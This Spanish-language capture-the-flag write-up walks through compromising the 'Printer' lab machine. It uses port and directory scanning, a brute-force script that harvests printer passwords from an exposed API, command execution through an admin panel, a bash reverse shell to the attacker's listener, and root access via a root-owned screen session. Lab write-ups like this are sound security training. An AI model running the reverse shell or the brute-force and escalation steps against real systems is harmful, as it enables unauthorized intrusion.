---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Printer Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 03:26 EDT
Nmap scan report for 192.168.5.86
Host is up (0.0039s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, 
LDAPSearchReq, LPDString, NCP, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Konica Minolta Printer Admin Panel
|     Password:
|   NULL: 
|_    Konica Minolta Printer Admin Panel
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at 
https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.95%I=7%D=8/21%Time=68A6CA19%P=x86_64-pc-linux-gnu%r(NU
SF:LL,25,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\n")%r(GetRequ
SF:est,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x
SF:20")%r(HTTPOptions,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel
SF:\n\nPassword:\x20")%r(FourOhFourRequest,2F,"\nKonica\x20Minolta\x20Prin
SF:ter\x20Admin\x20Panel\n\nPassword:\x20")%r(JavaRMI,2F,"\nKonica\x20Mino
SF:lta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(GenericLines,2F,"
SF:\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(R
SF:TSPRequest,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPass
SF:word:\x20")%r(RPCCheck,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20P
SF:anel\n\nPassword:\x20")%r(DNSVersionBindReqTCP,2F,"\nKonica\x20Minolta\
SF:x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(DNSStatusRequestTCP,2
SF:F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%
SF:r(Help,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword
SF::\x20")%r(SSLSessionReq,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20
SF:Panel\n\nPassword:\x20")%r(TerminalServerCookie,2F,"\nKonica\x20Minolta
SF:\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(TLSSessionReq,2F,"\n
SF:Konica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(Ker
SF:beros,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:
SF:\x20")%r(SMBProgNeg,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Pane
SF:l\n\nPassword:\x20")%r(X11Probe,2F,"\nKonica\x20Minolta\x20Printer\x20A
SF:dmin\x20Panel\n\nPassword:\x20")%r(LPDString,2F,"\nKonica\x20Minolta\x2
SF:0Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(LDAPSearchReq,2F,"\nKon
SF:ica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(LDAPBi
SF:ndReq,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:
SF:\x20")%r(SIPOptions,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Pane
SF:l\n\nPassword:\x20")%r(LANDesk-RC,2F,"\nKonica\x20Minolta\x20Printer\x2
SF:0Admin\x20Panel\n\nPassword:\x20")%r(TerminalServer,2F,"\nKonica\x20Min
SF:olta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(NCP,2F,"\nKonica
SF:\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20");
MAC Address: 08:00:27:E0:64:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.70 seconds
```

Veremos varios puertos interesantes, entre ellos un puerto `80` que suele alojar una pagina web y un puerto `9999` que por lo que vemos en el reporte parece ser una impresora en la que puedes iniciar sesion mediante unas credenciales, si entramos en el puerto `80` veremos una pagina normal y corriente de `apache2`, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.86/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10701]
/.php                 (Status: 403) [Size: 277]
/api                  (Status: 403) [Size: 277]
Progress: 121947 / 882244 (13.82%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 122101 / 882244 (13.84%)
===============================================================
Finished
===============================================================
```

Veremos que hay un recurso compartido llamado `/api` que es bastante interesante, por lo que vamos a ver que contiene dentro.

```shell
gobuster dir -u http://<IP>/api/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.86/api/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/printers             (Status: 200) [Size: 303]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
Progress: 397224 / 882244 (45.02%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 397506 / 882244 (45.06%)
===============================================================
Finished
===============================================================
```

Veremos que nos ha descubierto un recurso llamado `/printers`, si entramos dentro de `/printers` veremos lo siguiente en la pagina:

```
Search for your printer with the following format: printer<id>.<ext>
```

Veremos que esta utilizando una estructura de `id` y `extension`, por lo que podremos realizar un poco de `fuerza bruta` con varias extensiones y numeros, para saber cuales estan activos.

Vamos a crearnos un script para generar 2 archivos, uno que sea `ids.txt` y `exts.txt` con todo lo necesario.

> generateTexts.py

```python
# script.py

def generar_ids(nombre_archivo="ids.txt", limite=5000):
    """Genera un archivo con números del 0 hasta 'limite'."""
    with open(nombre_archivo, "w") as f:
        for i in range(limite + 1):
            f.write(f"{i}\n")
    print(f"Archivo '{nombre_archivo}' generado con {limite + 1} números.")


def generar_exts(nombre_archivo="exts.txt"):
    """Genera un archivo con algunas extensiones de ejemplo (sin punto)."""
    extensiones = [
        "json",
        "js",
        "txt",
        "php",
        "html",
        "css",
        "xml",
        "csv",
        "py",
        "java"
    ]
    with open(nombre_archivo, "w") as f:
        for ext in extensiones:
            f.write(f"{ext}\n")
    print(f"Archivo '{nombre_archivo}' generado con {len(extensiones)} extensiones.")


if __name__ == "__main__":
    generar_ids()
    generar_exts()
```

Los ejecutaremos de la siguiente forma:

```shell
python3 generateTexts.py
```

Info:

```
Archivo 'ids.txt' generado con 5001 números.
Archivo 'exts.txt' generado con 10 extensiones.
```

Ahora vamos a crear otro script en el que pruebe con dichos diccionarios la `API` de la impresora a ver que vemos.

> printer.py

```python
# brute_ctf.py
import requests

URL_BASE = "http://<IP>/api/printers/"   # endpoint del CTF
TIMEOUT = 5  # segundos de timeout

def cargar_lista(nombre_archivo):
    """Lee un archivo de texto y devuelve una lista de líneas sin saltos."""
    with open(nombre_archivo, "r") as f:
        return [line.strip() for line in f if line.strip()]

def fuerza_bruta(ids_file="ids.txt", exts_file="exts.txt", output_file="resultados.txt"):
    ids = cargar_lista(ids_file)
    exts = cargar_lista(exts_file)

    with open(output_file, "w") as salida:
        for id_val in ids:
            for ext in exts:
                printer_name = f"printer{id_val}.{ext}"
                url = URL_BASE + printer_name
                try:
                    r = requests.get(url, timeout=TIMEOUT)
                    if r.status_code == 200:
                        print(f"[+] Posible válido: {printer_name} --> {url}")
                        salida.write(f"{printer_name} --> {url}\n")
                except requests.RequestException:
                    # Ignora errores de conexión o timeouts
                    pass

    print(f"\n[✓] Fuerza bruta finalizada. Resultados guardados en '{output_file}'")

if __name__ == "__main__":
    fuerza_bruta()
```

Ahora lo ejecutaremos de esta forma:

```shell
python3 printer.py 
```

Info:

```
[+] Posible válido: printer1.json --> http://192.168.5.86/api/printers/printer1.json
[+] Posible válido: printer2.json --> http://192.168.5.86/api/printers/printer2.json
[+] Posible válido: printer3.json --> http://192.168.5.86/api/printers/printer3.json
[+] Posible válido: printer4.json --> http://192.168.5.86/api/printers/printer4.json
[+] Posible válido: printer5.json --> http://192.168.5.86/api/printers/printer5.json
[+] Posible válido: printer1599.json --> http://192.168.5.86/api/printers/printer1599.json
```

Veremos que nos ha encontrado estas impresoras, por lo que vamos a investigar que contiene cada una de ellas.

> viewJSON.py

```python
# view_jsons.py
import requests
import json

URLS = [
    "http://<IP>/api/printers/printer1.json",
    "http://<IP>/api/printers/printer2.json",
    "http://<IP>/api/printers/printer3.json",
    "http://<IP>/api/printers/printer4.json",
    "http://<IP>/api/printers/printer5.json",
    "http://<IP>/api/printers/printer1599.json",
]

TIMEOUT = 5

def mostrar_json(url):
    try:
        r = requests.get(url, timeout=TIMEOUT)
        r.raise_for_status()
        data = r.json()  # convierte en dict
        print(f"\n===== {url} =====")
        print(json.dumps(data, indent=4, ensure_ascii=False))  # formatea bonito
    except Exception as e:
        print(f"[!] Error con {url}: {e}")

if __name__ == "__main__":
    for url in URLS:
        mostrar_json(url)
```

Lo ejecutaremos de esta forma:

```shell
python3 viewJSON.py
```

Info:

```json
===== http://192.168.5.86/api/printers/printer1.json =====
{
    "printer": {
        "printer_id": "1",
        "printer_password": "P4ssw0rd!"
    }
}

===== http://192.168.5.86/api/printers/printer2.json =====
{
    "printer": {
        "printer_id": "2",
        "printer_password": "iloveme"
    }
}

===== http://192.168.5.86/api/printers/printer3.json =====
{
    "printer": {
        "printer_id": "3",
        "printer_password": "qwerty"
    }
}

===== http://192.168.5.86/api/printers/printer4.json =====
{
    "printer": {
        "printer_id": "4",
        "printer_password": "admin"
    }
}

===== http://192.168.5.86/api/printers/printer5.json =====
{
    "printer": {
        "printer_id": "5",
        "printer_password": "root"
    }
}

===== http://192.168.5.86/api/printers/printer1599.json =====
{
    "printer": {
        "printer_id": "1599",
        "printer_password": "$3cUr3Pr1nT3RP4ZZw0rD"
    }
}
```

Veremos que es una serie de contraseñas, por lo que podremos probarlas en el puerto `9999` que hemos visto antes a ver cual funciona de todas.

## Escalate user printer

### Printer (9999)

```shell
nc <IP> 9999
```

Info:

```
Konica Minolta Printer Admin Panel


Password: $3cUr3Pr1nT3RP4ZZw0rD

Please type "?" for HELP
>
```

Si vemos el `help` poniendo `?` veremos lo siguiente:

```
To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```

Vemos que con `exec` podemos ejecutar comandos a nivel de sistema, por lo que vamos a probar a ejecutar lo siguiente:

```shell
exec id
```

Info:

```
uid=1000(printer) gid=1000(printer) grupos=1000(printer)
```

Veremos que esta funcionando, por lo que vamos a realizar un `reverse shell` de esta forma:

```shell
exec bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

Ahora antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos lo de antes y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.86] 55832
bash: no se puede establecer el grupo de proceso de terminal (311): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
printer@printer:/var/spool/lpd$ whoami
whoami
printer
```

Veremos que ha funcionado, por lo que tendremos que sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Ahora vamos a leer la `flag` del usuario:

> user.txt

```
7cc698fe83419af87e0a504eb91913e2
```

## Escalate Privileges

Si listamos los permisos con `SUID` que tenemos a nivel de sistema, veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
263828     56 -rwsr-xr-x   1 root     root        55528 ene 20  2022 /usr/bin/mount
   263458     72 -rwsr-xr-x   1 root     root        71912 ene 20  2022 /usr/bin/su
   259697     60 -rwsr-xr-x   1 root     root        58416 feb  7  2020 /usr/bin/chfn
   259700     88 -rwsr-xr-x   1 root     root        88304 feb  7  2020 /usr/bin/gpasswd
   259698     52 -rwsr-xr-x   1 root     root        52880 feb  7  2020 /usr/bin/chsh
   263830     36 -rwsr-xr-x   1 root     root        35040 ene 20  2022 /usr/bin/umount
   259701     64 -rwsr-xr-x   1 root     root        63960 feb  7  2020 /usr/bin/passwd
   263292     44 -rwsr-xr-x   1 root     root        44632 feb  7  2020 /usr/bin/newgrp
   280410    472 -rwsr-xr-x   1 root     root       482312 feb 27  2021 /usr/bin/screen
   273849    472 -rwsr-xr-x   1 root     root       481608 jul  2  2022 /usr/lib/openssh/ssh-keysign
   264755     52 -rwsr-xr--   1 root     messagebus    51336 oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Veremos un binario interesante en esta linea:

```
280410  472 -rwsr-xr-x   1 root  root   482312 feb 27  2021 /usr/bin/screen
```

Si leemos la documentacion del binario veremos que se utiliza para crear sesion dentro del sistema por asi decirlo, si listamos los procesos que hay en ejecuccion en el sistema veremos lo siguiente:

```shell
ps -aux | grep "screen"
```

Info:

```
root         318  0.0  0.0   2484   564 ?        Ss   09:25   0:01 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
printer   104776  0.0  0.0   3112   700 pts/1    R+   10:27   0:00 grep screen
```

Vemos que esta ejecutando una sesion como `root` con `screen` por lo que podremos realizar lo siguiente:

```shell
screen -x root/
```

Info:

```
root@printer:~# whoami
root
```

Veremos que con estos ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
616e894462fed90fec26f828a0a6c50e
```
